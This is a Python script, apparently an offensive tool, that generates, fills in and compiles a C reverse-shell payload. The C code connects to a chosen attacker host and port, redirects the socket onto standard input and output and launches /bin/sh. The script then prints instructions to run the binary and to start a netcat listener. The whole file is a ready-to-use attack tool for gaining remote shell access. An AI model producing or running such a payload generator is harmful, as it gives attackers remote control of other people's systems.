#! /usr/bin/python3
import os
import sys
import pyfiglet as figlet
# Filenames and current working folder
currentfolder=(os.getcwd())
tmp="/tmp/"
filename='revshell.c'
filename=f"{tmp}{filename}"

# Colors
white="\033[0m"
grey="\033[90m"
red="\033[91m"
green="\033[92m"
yellow="\033[93m"
blue="\033[94m"
purple="\033[95m"
success=f"{green}[+] "
alert=f"{yellow}[!] "
progress=f"{blue}[*] "
fail=f"{red}[-] "
end=f"{white}"
arguments=sys.argv
scriptname=arguments[0].replace("./","")

def banner():
	string=r"""                                            __              ___    ___      
                                           /\ \            /\_ \  /\_ \     
  ___           _ __    __   __  __    ____\ \ \___      __\//\ \ \//\ \    
 /'___\ _______/\`'__\/'__`\/\ \/\ \  /',__\\ \  _ `\  /'__`\\ \ \  \ \ \   
/\ \__//\______\ \ \//\  __/\ \ \_/ |/\__, `\\ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
\ \____\/______/\ \_\\ \____\\ \___/ \/\____/ \ \_\ \_\ \____\/\____\/\____\
 \/____/         \/_/ \/____/ \/__/   \/___/   \/_/\/_/\/____/\/____/\/____/
                                                                            
                                                                            
"""
	print(f"{purple}{string}{end}")
	print(f"{blue}Usage{white}\t\t:\t{yellow}python3 {scriptname} yourip yourport mode (32-bit or 64-bit) ")
	print(f"     \t\t:\t{yellow}python3 {scriptname} lhost lport mode (mode is either 32/64)")
	
	print(f"\n{blue}Example   \t:\t{yellow}python3 {scriptname} 127.0.0.1 4444 32{end}\n\n")

def gentemplate(lhost,lport):
	print(f"{progress} Generating template{end}")
	string="""#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = XLPORT;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("XLHOST");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}"""
	string=string.replace(f"XLHOST",f"{lhost}")
	string=string.replace(f"XLPORT",f"{lport}")
	return string

def main(lhost,lport,mode):
	global filename
	print(f"{success} Starting ")
	print(f"{success} Using LHOST {lhost}{end}")
	print(f"{success} Using LPORT {lport}{end}")
	print(f"{success} Using MODE {mode}{end}")

	print(f"\n{alert} Creating template {mode}{end}")
	contents=gentemplate(lhost,lport)
	print(f"{progress} Writing results to file {filename}{end}")
	try:
		with open(filename,"w") as tmpfile:
			tmpfile.write(contents)
			tmpfile.close()
		print(f"{success} Written to file '{filename}' successfully{end}")

	except:
		print(f"{fail} Failed to write to file '{filename}' {end}")
		exit()
	print(f"\n{alert} Compiling executable")
	print(f"{progress} Compiling the file '{filename}' in {yellow}{mode}-bit-mode{end}")
	compile(filename,mode)
	exit()


def compile(filename,mode):
	global tmp
	outfile=f"{tmp}reverseshell"
	try:
		if mode == '64':
			command=f"gcc -m64 {filename} -o {outfile}"
		else:
			command=f"gcc -m32 {filename} -o {outfile}"
		print(f"{progress}Running Command '{command}'")
		os.system(f"{command}")
		print(f"{success}File '{filename}' has been compiled successfully")
		print(f"\n\n{success}Run 'chmod +x {outfile};{outfile}'")
		print(f"\n{grey}Set up listener using:\t {purple}nc -vvlp {lport}{end}")
	except:
		print(f"{fail}Failed to compile file  '{filename}' ")







if __name__ == "__main__":
	banner()
	try:
		lhost=arguments[1]
		lport=arguments[2]
		if(len(arguments) == 4):
			mode=arguments[3]
		else:
			mode="32"
		main(lhost,lport,mode)
	except:
		exit()
